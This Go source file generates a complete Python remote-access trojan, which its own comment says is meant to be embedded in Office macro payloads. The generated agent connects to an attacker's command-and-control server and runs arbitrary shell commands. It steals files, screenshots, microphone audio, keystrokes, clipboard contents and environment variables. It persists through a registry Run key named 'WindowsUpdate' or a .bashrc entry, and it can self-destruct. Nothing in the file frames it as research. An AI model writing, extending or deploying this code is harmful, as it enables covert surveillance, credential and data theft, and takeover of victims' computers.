package main

import "fmt"

// generatePythonAgent returns the full Python agent source for the given session parameters.
// The returned string is embedded verbatim into Office macro payloads.
func generatePythonAgent(ip, port, token string, persistent bool) string {
	persistStr := "False"
	if persistent {
		persistStr = "True"
	}

	return fmt.Sprintf(`import os, socket, struct, subprocess, sys, time, json, shutil, platform, getpass, threading

DOCX_PATH = r'%%DOCX_PATH%%'
PERSISTENT = %s
SESSION_TOKEN = "%s"
C2_HOST = "%s"
C2_PORT = %s
RECONNECT_DELAY = 5

def recvall(s, n):
    data = b''
    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_msg(s, msg_type, payload):
    try:
        header = struct.pack('>H', msg_type) + struct.pack('>I', len(payload))
        s.sendall(header + payload)
    except:
        pass

def recv_msg(s):
    try:
        header = recvall(s, 6)
        if not header:
            return None, None
        msg_type = struct.unpack('>H', header[:2])[0]
        length = struct.unpack('>I', header[2:6])[0]
        if length > 0:
            payload = recvall(s, length)
            if payload is None:
                return None, None
        else:
            payload = b''
        return msg_type, payload
    except:
        return None, None

def exec_cmd(s, cmd):
    try:
        if os.name == 'nt':
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, executable='/bin/bash')
        stdout, stderr = proc.communicate()
        send_msg(s, 0x1002, stdout + stderr)
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def get_sysinfo(s):
    try:
        info = {
            'hostname': platform.node(),
            'platform': platform.platform(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'username': getpass.getuser(),
            'cwd': os.getcwd(),
            'pid': os.getpid()
        }
        send_msg(s, 0x5002, json.dumps(info).encode())
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def handle_download(s, path):
    try:
        if not os.path.exists(path):
            send_msg(s, 0x9001, b'File not found')
            return
        with open(path, 'rb') as f:
            while True:
                data = f.read(4096)
                if not data:
                    break
                send_msg(s, 0x2002, data)
                time.sleep(0.005)
        send_msg(s, 0x2003, b'')
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def handle_upload(s, path, data):
    try:
        with open(path, 'wb') as f:
            f.write(data)
        send_msg(s, 0x1002, b'Upload complete')
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def handle_file_delete(s, path):
    try:
        if os.path.exists(path):
            os.remove(path)
            send_msg(s, 0x2007, b'Deleted')
        else:
            send_msg(s, 0x9001, b'File not found')
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def handle_file_list(s, path):
    try:
        if not os.path.exists(path):
            send_msg(s, 0x9001, b'Path not found')
            return
        items = []
        for item in os.listdir(path):
            full_path = os.path.join(path, item)
            stat = os.stat(full_path)
            items.append({
                'name': item,
                'size': stat.st_size,
                'is_dir': os.path.isdir(full_path),
                'mtime': stat.st_mtime
            })
        send_msg(s, 0x2009, json.dumps(items).encode())
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def handle_change_dir(s, path):
    try:
        os.chdir(path)
        send_msg(s, 0x200B, os.getcwd().encode())
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def handle_get_cwd(s):
    try:
        send_msg(s, 0x200D, os.getcwd().encode())
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def install_persistence():
    try:
        if os.name == 'nt':
            import winreg as reg
            exe_path = sys.executable
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_WRITE)
            reg.SetValueEx(key, "WindowsUpdate", 0, reg.REG_SZ, exe_path)
            key.Close()
            return True
        else:
            script_path = os.path.expanduser("~/.bashrc")
            with open(script_path, 'a') as f:
                f.write("\n%s &\n" %% sys.executable)
            return True
    except:
        return False

def remove_persistence():
    try:
        if os.name == 'nt':
            import winreg as reg
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_WRITE)
            reg.DeleteValue(key, "WindowsUpdate")
            key.Close()
            return True
        return False
    except:
        return False

def self_destruct():
    try:
        if os.name == 'nt':
            import winreg as reg
            try:
                key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_WRITE)
                reg.DeleteValue(key, "WindowsUpdate")
                key.Close()
            except:
                pass
        if DOCX_PATH and os.path.exists(DOCX_PATH):
            try:
                os.remove(DOCX_PATH)
            except:
                pass
        exe_path = sys.executable
        if os.name == 'nt':
            subprocess.Popen(['cmd', '/c', 'timeout /t 2 && del /f "%s"' %% exe_path], shell=True)
        else:
            os.remove(exe_path)
        sys.exit(0)
    except:
        sys.exit(1)

_keylog_keys = []
_keylog_running = False
_keylog_thread = None

def _keylog_worker():
    global _keylog_running, _keylog_keys
    try:
        import ctypes
        user32 = ctypes.windll.user32
        import time as _time
        prev = {}
        while _keylog_running:
            for vk in range(8, 256):
                state = user32.GetAsyncKeyState(vk) & 0x8000
                if state and not prev.get(vk):
                    try:
                        ch = chr(vk)
                    except:
                        ch = '[%d]' %% vk
                    _keylog_keys.append(ch)
                prev[vk] = state
            _time.sleep(0.01)
    except Exception as e:
        _keylog_keys.append('[keylog error: %%s]' %% str(e))

def handle_screenshot(s):
    import tempfile, os
    tmp = tempfile.mktemp(suffix='.png')
    try:
        try:
            import mss
            with mss.mss() as sct:
                sct.shot(output=tmp)
        except ImportError:
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                img.save(tmp)
            except ImportError:
                send_msg(s, 0x9001, b'Install mss or Pillow: pip install mss')
                return
        handle_download(s, tmp)
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())
    finally:
        try: os.remove(tmp)
        except: pass

def handle_record(s, seconds):
    import tempfile, os
    tmp = tempfile.mktemp(suffix='.wav')
    try:
        import pyaudio, wave
        CHUNK = 1024; FMT = pyaudio.paInt16; CH = 1; RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FMT, channels=CH, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * seconds)):
            frames.append(stream.read(CHUNK))
        stream.stop_stream(); stream.close(); p.terminate()
        wf = wave.open(tmp, 'wb')
        wf.setnchannels(CH); wf.setsampwidth(p.get_sample_size(FMT)); wf.setframerate(RATE)
        wf.writeframes(b''.join(frames)); wf.close()
        handle_download(s, tmp)
    except ImportError:
        send_msg(s, 0x9001, b'pyaudio not available: pip install pyaudio')
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())
    finally:
        try: os.remove(tmp)
        except: pass

def handle_search(s, pattern):
    import fnmatch, os
    results = []
    try:
        for root, dirs, files in os.walk('.'):
            for name in files:
                if fnmatch.fnmatch(name, pattern):
                    results.append(os.path.join(root, name))
            if len(results) > 500:
                break
        send_msg(s, 0xB002, '\n'.join(results).encode())
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def handle_zip(s, path):
    import tempfile, os, zipfile
    tmp = tempfile.mktemp(suffix='.zip')
    try:
        base = os.path.basename(path.rstrip('/\\'))
        with zipfile.ZipFile(tmp, 'w', zipfile.ZIP_DEFLATED) as zf:
            if os.path.isdir(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        fp = os.path.join(root, file)
                        zf.write(fp, os.path.relpath(fp, os.path.dirname(path)))
            else:
                zf.write(path, base)
        handle_download(s, tmp)
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())
    finally:
        try: os.remove(tmp)
        except: pass

def handle_say(s, text):
    try:
        import subprocess
        safe = text.replace("'", "''")
        ps_cmd = "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('%%s')" %% safe
        result = subprocess.run(
            ['powershell', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', ps_cmd],
            capture_output=True, timeout=60
        )
        if result.returncode != 0:
            err = (result.stderr or b'TTS failed').decode('utf-8', errors='ignore').strip()
            send_msg(s, 0x9001, err.encode() if err else b'TTS command failed')
        else:
            send_msg(s, 0x1002, b'Speaking done')
    except subprocess.TimeoutExpired:
        send_msg(s, 0x9001, b'TTS timed out after 60s')
    except FileNotFoundError:
        send_msg(s, 0x9001, b'powershell not found in PATH')
    except Exception as e:
        send_msg(s, 0x9001, str(e).encode())

def connect():
    global _keylog_running, _keylog_thread
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, int(C2_PORT)))
            send_msg(s, 0x0001, SESSION_TOKEN.encode())

            auth_type, auth_payload = recv_msg(s)
            if auth_type != 0x0002:
                s.close()
                time.sleep(RECONNECT_DELAY)
                continue

            while True:
                msg_type, payload = recv_msg(s)
                if msg_type is None:
                    break

                if msg_type == 0x1001:
                    cmd = payload.decode('utf-8', errors='ignore')
                    if cmd == 'whoami':
                        send_msg(s, 0x1002, getpass.getuser().encode())
                    elif cmd == 'sysinfo':
                        get_sysinfo(s)
                    elif cmd.startswith('say:'):
                        handle_say(s, cmd[4:])
                    elif cmd == 'processes':
                        exec_cmd(s, 'tasklist /fo csv /nh')
                    elif cmd == 'netstat':
                        exec_cmd(s, 'netstat -ano')
                    elif cmd == 'arp':
                        exec_cmd(s, 'arp -a')
                    elif cmd == 'users':
                        exec_cmd(s, 'net user')
                    elif cmd == 'drives':
                        exec_cmd(s, 'wmic logicaldisk get name,size,freespace,description')
                    elif cmd == 'env':
                        import os as _os
                        env_str = '\n'.join(f'{k}={v}' for k, v in _os.environ.items())
                        send_msg(s, 0x1002, env_str.encode())
                    elif cmd == 'clipboard':
                        try:
                            import subprocess as _sp
                            r = _sp.run(['powershell', '-Command', 'Get-Clipboard'], capture_output=True)
                            send_msg(s, 0x1002, r.stdout or b'(clipboard empty)')
                        except Exception as e:
                            send_msg(s, 0x9001, str(e).encode())
                    else:
                        exec_cmd(s, cmd)

                elif msg_type == 0x2001:
                    path = payload.decode('utf-8', errors='ignore')
                    handle_download(s, path)

                elif msg_type == 0x2004:
                    parts = payload.split(b'\x00', 1)
                    if len(parts) == 2:
                        path, data = parts
                        handle_upload(s, path.decode(), data)

                elif msg_type == 0x2006:
                    path = payload.decode('utf-8', errors='ignore')
                    handle_file_delete(s, path)

                elif msg_type == 0x2008:
                    path = payload.decode('utf-8', errors='ignore')
                    handle_file_list(s, path)

                elif msg_type == 0x200A:
                    path = payload.decode('utf-8', errors='ignore')
                    handle_change_dir(s, path)

                elif msg_type == 0x200C:
                    handle_get_cwd(s)

                elif msg_type == 0x3001:
                    if install_persistence():
                        send_msg(s, 0x3003, b'Persistence installed')
                    else:
                        send_msg(s, 0x9001, b'Failed to install persistence')

                elif msg_type == 0x3002:
                    if remove_persistence():
                        send_msg(s, 0x3003, b'Persistence removed')
                    else:
                        send_msg(s, 0x9001, b'Failed to remove persistence')

                elif msg_type == 0x4001:
                    send_msg(s, 0x4002, b'Self-destruct initiated')
                    s.close()
                    self_destruct()
                    return

                elif msg_type == 0x6001:
                    threading.Thread(target=handle_screenshot, args=(s,), daemon=True).start()

                elif msg_type == 0x7001:
                    if not _keylog_running:
                        _keylog_running = True
                        _keylog_thread = threading.Thread(target=_keylog_worker, daemon=True)
                        _keylog_thread.start()
                        send_msg(s, 0x1002, b'Keylogger started')
                    else:
                        send_msg(s, 0x1002, b'Keylogger already running')

                elif msg_type == 0x7002:
                    _keylog_running = False
                    send_msg(s, 0x1002, b'Keylogger stopped')

                elif msg_type == 0x7003:
                    data = ''.join(_keylog_keys)
                    _keylog_keys.clear()
                    send_msg(s, 0x7004, data.encode() if data else b'(no keystrokes captured)')

                elif msg_type == 0x8001:
                    try:
                        secs = int(payload.decode())
                    except:
                        secs = 5
                    threading.Thread(target=handle_record, args=(s, secs), daemon=True).start()

                elif msg_type == 0xB001:
                    pattern = payload.decode('utf-8', errors='ignore')
                    threading.Thread(target=handle_search, args=(s, pattern), daemon=True).start()

                elif msg_type == 0xC001:
                    path = payload.decode('utf-8', errors='ignore')
                    threading.Thread(target=handle_zip, args=(s, path), daemon=True).start()

        except Exception:
            pass

        finally:
            try:
                s.close()
            except:
                pass

        if not PERSISTENT:
            break
        time.sleep(RECONNECT_DELAY)

if __name__ == '__main__':
    connect()
`, persistStr, token, ip, port)
}
